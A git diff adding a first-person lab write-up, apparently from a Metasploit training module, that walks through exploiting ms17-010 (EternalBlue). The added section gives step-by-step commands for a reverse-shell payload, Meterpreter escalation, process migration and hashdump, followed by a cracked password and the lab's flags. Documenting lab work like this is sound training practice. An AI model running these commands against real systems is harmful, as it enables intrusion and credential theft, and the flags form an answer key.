@@ -442,6 +442,24 @@ When a vulnerability is exploited, a **session** is created and a communication 
 
 To interact with an active session, I use `sessions -i SESSION_NUMBER`.
 
+For my last task in this module, I had to exploit a system vulnerable to **ms17-010**. I started by scanning the target machine using **Nmap** with the command `nmap -p- --open -sV TARGET_IP` to discover open ports and services. This scan revealed **3 open ports** under 1000.
+
+Next, I launched **Metasploit Framework** by running `msfconsole`. I searched for the relevant exploit with `search ms17-010` and selected the module `exploit/windows/smb/ms17_010_eternalblue` using `use exploit/windows/smb/ms17_010_eternalblue`. I checked required parameters with `show options` and set the target IP using `set RHOSTS TARGET_IP`. I also set the payload to `windows/x64/shell/reverse_tcp` using the `set payload` command.
+
+After configuring everything, I ran the exploit with `exploit` and successfully gained a shell. I backgrounded the session using `CTRL + Z`.
+
+To escalate privileges, I used the post-exploitation module `post/multi/manage/shell_to_meterpreter`. I selected it with `use post/multi/manage/shell_to_meterpreter`, listed active sessions using `sessions`, and set the required **SESSION** parameter accordingly. Running this module converted my shell into a Meterpreter session.
+
+I confirmed system-level access by running `getsystem` and verified it with `whoami` in a Windows shell, confirming I was **NT AUTHORITY\SYSTEM**. I then listed processes with `ps`, identified a SYSTEM process, and migrated into it using `migrate PROCESS_ID`.
+
+Finally, I dumped password hashes with `hashdump`, found the non-default user **Jon**, and cracked the password as **alqfna22**.
+
+The three flags I found were:
+
+- `flag{access_the_machine}` at the system root.
+- `flag{sam_database_elevated_access}` in the SAM database.
+- `flag{admin_documents_can_be_valuable}` in the Administrator’s documents folder.
+
 ### Premium-Only Content
 
 - **Metasploit: Exploitation**
